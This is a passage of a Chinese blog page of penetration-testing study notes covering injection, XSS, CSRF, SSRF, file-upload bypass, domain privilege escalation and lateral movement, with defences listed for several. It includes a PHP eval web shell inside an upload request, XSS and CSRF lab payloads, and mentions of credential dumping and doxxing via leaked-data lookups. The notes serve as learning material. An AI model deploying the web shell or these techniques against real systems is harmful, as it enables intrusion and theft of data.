+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>updatexml<span style="color:#f92672">()</span>，extractvalue<span style="color:#f92672">()</span>，floor<span style="color:#f92672">()</span> ,exp<span style="color:#f92672">()</span>
+</span></span></code></pre></div></li>
+<li>
+<p>宽字节</p>
+</li>
+<li>
+<p>二次编码</p>
+</li>
+<li>
+<p>dnslog</p>
+</li>
+</ol>
+<h2 id="预防措施">预防措施<a hidden class="anchor" aria-hidden="true" href="#预防措施">#</a></h2>
+<ol>
+<li>不信任用户的任何输入，一定一定要对可能引起注入的字符做转义和过滤</li>
+<li>白名单方式</li>
+<li>限制查询长度和类型</li>
+<li>数据库用户的权限配置</li>
+<li>限制目录权限</li>
+</ol>
+<h2 id="mysql注入特征">Mysql注入特征<a hidden class="anchor" aria-hidden="true" href="#mysql注入特征">#</a></h2>
+<p>3306，默认不区分大小写，information_schema信息数据库</p>
+<h1 id="二登录框测试">二、登录框测试<a hidden class="anchor" aria-hidden="true" href="#二登录框测试">#</a></h1>
+<p>1、登录成功后生成的Cookie，是否是httponly (否则容易被脚本盗取)</p>
+<p>2、用户名和密码是否通过加密的方式发送给web服务器</p>
+<p>3、用户名和密码的验证，应该是用服务器验证，而不单单是在客户端用javascript验证</p>
+<p>4、用户名和密码的输入框，是否屏蔽SQL注入攻击</p>
+<p>5、用户名和密码的输入框，应该禁止输入脚本（防止XSS攻击）</p>
+<p>6、是否有错误登录的次数限制（防止暴力破解）</p>
+<h1 id="三文件上传">三、文件上传<a hidden class="anchor" aria-hidden="true" href="#三文件上传">#</a></h1>
+<h2 id="黑名单绕过">黑名单绕过<a hidden class="anchor" aria-hidden="true" href="#黑名单绕过">#</a></h2>
+<p>大小写，重写，特殊解析（php3,5,7），加空格，加点绕过，.htaccess</p>
+<h2 id="白名单">白名单<a hidden class="anchor" aria-hidden="true" href="#白名单">#</a></h2>
+<p><strong>%00</strong>截断，修改MIME文件类型</p>
+<h2 id="修复">修复<a hidden class="anchor" aria-hidden="true" href="#修复">#</a></h2>
+<p>白名单的方式判断文件后缀是否合法。</p>
+<p>重写文件名</p>
+<p>设置不可执行</p>
+<h1 id="四文件包含">四、文件包含<a hidden class="anchor" aria-hidden="true" href="#四文件包含">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>include，require
+</span></span></code></pre></div><h3 id="文件包含">文件包含<a hidden class="anchor" aria-hidden="true" href="#文件包含">#</a></h3>
+<p>http://192.168.65.135:3366/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2022/05/21/9097236288ae320dc16631692493.jpg&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</p>
+<p>待补档，没有太深入学</p>
+<h1 id="五xss">五、XSS<a hidden class="anchor" aria-hidden="true" href="#五xss">#</a></h1>
+<h2 id="原理-1">原理<a hidden class="anchor" aria-hidden="true" href="#原理-1">#</a></h2>
+<p><a href="https://so.csdn.net/so/search?q=XSS&amp;spm=1001.2101.3001.7020">XSS</a>的原理是WEB应用程序混淆了用户提交的数据和JS脚本的代码边界，导致浏览器把用户的输入当成了JS代码来执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;xss&#34;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>#&#39; onclick=&#34;alert(&#39;xss&#39;)&#34;&gt;
+</span></span></code></pre></div><p>反射型：用户点击</p>
+<p>存储型：存在服务器，访问即中招</p>
+<p>DOM型：只是前段，特殊反射</p>
+<h2 id="防御">防御<a hidden class="anchor" aria-hidden="true" href="#防御">#</a></h2>
+<p>验证，编码，检测和过滤</p>
+<p>对输入(和URL参数)进行过滤，对输出进行转义。</p>
+<h1 id="六csrf">六、CSRF<a hidden class="anchor" aria-hidden="true" href="#六csrf">#</a></h1>
+<h2 id="原理-2">原理<a hidden class="anchor" aria-hidden="true" href="#原理-2">#</a></h2>
+<p>攻击者通过伪造用户的浏览器的请求，向访问一个用户自己曾经认证访问过的网站发送出去，使目标网站接收并误以为是用户的真实操作而去执行命令。常用于盗取账号、转账、发送虚假消息等。攻击者利用网站对请求的验证漏洞而实现这样的攻击行为，网站能够确认请求来源于用户的浏览器，却不能验证请求是否源于用户的真实意愿下的操作行为。</p>
+<p>以下为pikachu靶场的测试用例</p>
+<p>姓名:allen</p>
+<p>性别:boy</p>
+<p>手机:13676767767</p>
+<p>住址:nba 76</p>
+<p>邮箱:allen@pikachu.com</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit
+</span></span></code></pre></div><h2 id="修复-1">修复<a hidden class="anchor" aria-hidden="true" href="#修复-1">#</a></h2>
+<p>token</p>
+<p>验证<strong>Referer</strong></p>
+<h1 id="七ssrf">七、ssrf<a hidden class="anchor" aria-hidden="true" href="#七ssrf">#</a></h1>
+<h2 id="原理-3">原理<a hidden class="anchor" aria-hidden="true" href="#原理-3">#</a></h2>
+<p>SSRF 漏洞的产生，主要是因为在服务端的 Web 应用，需要从其他服务器拉取数据资源，比如图片、视频、文件的上传/下载、业务数据处理结果，但其请求地址可被外部用户控制。</p>
+<p>http://192.168.65.135:3366/vul/ssrf/ssrf_fgc.php?file=http://127.0.0.1/vul/ssrf/1.txt</p>
+<h2 id="修复-2">修复<a hidden class="anchor" aria-hidden="true" href="#修复-2">#</a></h2>
+<ul>
+<li>禁止302跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</li>
+<li>过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</li>
+<li>禁用高危协议，例如：gopher、dict、ftp、file等，只允许http/https。</li>
+<li>设置URL白名单或者限制内网IP。</li>
+<li>限制请求的端口为http的常用端口，或者根据业务需要开放远程调用服务的端口。</li>
+<li>catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务。</li>
+</ul>
+<h1 id="八文件上传">八、文件上传<a hidden class="anchor" aria-hidden="true" href="#八文件上传">#</a></h1>
+<p>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;198337553110896437781972103010
+Content-Disposition: form-data; name=&ldquo;uploadfile&rdquo;; filename=&ldquo;shell.php%00.jpg&rdquo;
+Content-Type: image/jpg</p>
+<p>GIF89a?</p>
+<?php @eval($_POST['cmd']); ?>
+<h1 id="九渗透测试基本流程和工具">九、渗透测试基本流程和工具<a hidden class="anchor" aria-hidden="true" href="#九渗透测试基本流程和工具">#</a></h1>
+<h2 id="流程">流程<a hidden class="anchor" aria-hidden="true" href="#流程">#</a></h2>
+<p>1.明确目标
+2.分析风险，获得授权
+3.信息收集</p>
+<p>IP、端口识别框架、服务器类型、数据库类型等等</p>
+<p>4.漏洞探测（手动&amp;自动）</p>
+<p>AWVS,Appscan</p>
+<p>5.漏洞验证</p>
+<p>6.信息分析
+7.利用漏洞，获取数据</p>
+<p>留后门，擦脚印</p>
+<p>8.信息整理
+9.形成报告</p>
+<h2 id="工具">工具<a hidden class="anchor" aria-hidden="true" href="#工具">#</a></h2>
+<p>Burp Suite</p>
+<p>Nmap</p>
+<p>sqlmap</p>
+<p>AppScan</p>
+<p>御剑</p>
+<p>shell管理工具，蚁剑冰蝎哥斯拉</p>
+<p>在线的whois</p>
+<p>各种搜索引擎</p>
+<p>社工库</p>
+<h2 id="漏扫工具">漏扫工具<a hidden class="anchor" aria-hidden="true" href="#漏扫工具">#</a></h2>
+<p>AWVS、Goby、Appscan</p>
+<h1 id="十其他的一些杂项">十、其他的一些杂项<a hidden class="anchor" aria-hidden="true" href="#十其他的一些杂项">#</a></h1>
+<h2 id="蚁剑冰蝎哥斯拉区别">蚁剑冰蝎哥斯拉区别<a hidden class="anchor" aria-hidden="true" href="#蚁剑冰蝎哥斯拉区别">#</a></h2>
+<h3 id="1-蚁剑">1. 蚁剑<a hidden class="anchor" aria-hidden="true" href="#1-蚁剑">#</a></h3>
+<p>两次http请求</p>
+<p>第一次 url编码@ini_set(&ldquo;display_errors&rdquo;, &ldquo;0&rdquo;);@set_time_limit(0);</p>
+<p>第二次 列出目录</p>
+<p>0</p>
+<h3 id="2-冰蝎">2. 冰蝎<a hidden class="anchor" aria-hidden="true" href="#2-冰蝎">#</a></h3>
+<p>两次</p>
+<p>第一次 请求</p>
+<p>第二次 phpinfo</p>
+<p>AES 密码是md5散列值的前16位，MD5 值前 16 位已经在服务端写死了并加入 session</p>
+<h3 id="3-哥斯拉">3. 哥斯拉<a hidden class="anchor" aria-hidden="true" href="#3-哥斯拉">#</a></h3>
+<p>三次</p>
+<p>第一次 请求数据建立session</p>
+<p>第二次响应设置session</p>
+<p>第三次 第二次响应一致</p>
+<h2 id="内网渗透工具">内网渗透工具<a hidden class="anchor" aria-hidden="true" href="#内网渗透工具">#</a></h2>
+<p>cobalt strike</p>
+<p>msf</p>
+<p>mimikatz</p>
+<p>ew Earthworm</p>
+<p>frp</p>
+<h2 id="域渗透">域渗透<a hidden class="anchor" aria-hidden="true" href="#域渗透">#</a></h2>
+<p><a href="https://zhuanlan.zhihu.com/p/404210156">知乎</a></p>
+<p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库</p>
+<p>通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从域成员主机内存中dump出域管理员密码，进而拿下域控制器、渗透整个内网。</p>
+<h2 id="提权权限维持">提权、权限维持<a hidden class="anchor" aria-hidden="true" href="#提权权限维持">#</a></h2>
+<h3 id="脏牛提权">脏牛提权<a hidden class="anchor" aria-hidden="true" href="#脏牛提权">#</a></h3>
+<p>Linux Kernel&gt;=2.6.22的所有linux主机（没打过补丁的）</p>
+<p>sudo提权，glibc提取、suid提权</p>
+<p>ms14-058 admin -&gt; system</p>
+<p>ms14-068 域电脑 -&gt; 域控主机</p>
+<p>漏洞产生原理：用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos  票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>查看是否打补丁<span style="color:#f92672">(</span>KB3011780<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span>wmic qfe get hotfixid
+</span></span><span style="display:flex;"><span>攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid
+</span></span></code></pre></div><h2 id="应急响应工具">应急响应工具<a hidden class="anchor" aria-hidden="true" href="#应急响应工具">#</a></h2>
+<p><a href="https://blog.csdn.net/weixin_41665162/article/details/119982217">思路</a></p>
+<p><a href="https://blog.csdn.net/qq_53577336/article/details/120676981">https://blog.csdn.net/qq_53577336/article/details/120676981</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/397663694">火麒麟</a>：看进程，成员</p>
+<p>360星图，看日志文件</p>
+<p>微步情报分析</p>
+<p>在线沙箱</p>
+<p>病毒查杀</p>
+<p><a href="https://linux.cn/article-8412-1.html">大全</a></p>
+<h2 id="漏洞复现">漏洞复现<a hidden class="anchor" aria-hidden="true" href="#漏洞复现">#</a></h2>
+<p>iis，nginx解析漏洞，永恒之蓝</p>
+<p>weblogic，shiro，fastjson，stust2，log4j，jboss</p>
+<ol>
+<li>IIS</li>
+</ol>
+<p>IIS 6.0—— /xx.asp/xx.jpg</p>
+<p>IIS 7.0—— 默认Fast-cgi开启，直接在图片地址后面输入/.php就会将图片当做php解析</p>
+<ol>
+<li>Apache</li>
+</ol>
+<p>Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断</p>
+<ol>
+<li>Nginx</li>
+</ol>
+<p>Nginx——版本小于0.8.37 利用方法和IIS7.0一样</p>
+<ol>
+<li>JBoss</li>
+<li>WebLogic</li>
+<li>Shiro反序列化漏洞</li>
+</ol>
+<p>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：</p>
+<p>得到rememberMe的cookie值 &ndash;&gt; Base64解码 &ndash;&gt; AES解密 &ndash;&gt; 反序列化</p>
+<p>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p>
+<p>payload 构造的顺序则就是相对的反着来：</p>
+<p>恶意命令&ndash;&gt;序列化&ndash;&gt;AES加密&ndash;&gt;base64编码&ndash;&gt;发送cookie</p>
+<p>在整个漏洞利用过程中，比较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修改默认的密钥，就自己可以生成恶意构造的cookie了。</p>
+<h2 id="横向渗透">横向渗透<a hidden class="anchor" aria-hidden="true" href="#横向渗透">#</a></h2>
+<p>SMB横向-psexec&amp;smbexec</p>
+<h2 id="流量转发工具">流量转发工具<a hidden class="anchor" aria-hidden="true" href="#流量转发工具">#</a></h2>
+<p>ew Earthworm</p>
+<p>frp</p>
+<p>cs</p>
+<h2 id="流量分析">流量分析<a hidden class="anchor" aria-hidden="true" href="#流量分析">#</a></h2>
+<p>wireshark</p>
+<p>科来</p>
+<p>http matches &ldquo;(.*?)eval&rdquo;</p>
+<p>ip.addr ==101.36.79.67 &amp;&amp; http matches &ldquo;(.*?)acunetix&rdquo;</p>
+<h2 id="溯源">溯源<a hidden class="anchor" aria-hidden="true" href="#溯源">#</a></h2>
+<p>获取IP，上线威胁情报社区分析，ping得到ip，反查域名查whois信息</p>
+<p>历史注册域名</p>
+<p>手机号就丢进社工库</p>
+<p>支付宝转账得姓名</p>
+<p>QQ得到更多信息</p>
+<h2 id="waf绕过">waf绕过<a hidden class="anchor" aria-hidden="true" href="#waf绕过">#</a></h2>
+<p>大小写、特殊字符替换空格和字符、编码绕过</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://x1a05hen.github.io/tags/%E6%A0%87%E7%AD%BE1/">标签1</a></li>
+      <li><a href="https://x1a05hen.github.io/tags/%E6%A0%87%E7%AD%BE2/">标签2</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://x1a05hen.github.io/posts/other/redmi/">
+    <span class="title">Next »</span>
+    <br>
+    <span>RedMi AC2100 刷固件</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://x1a05hen.github.io">x1a0&#39;s Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
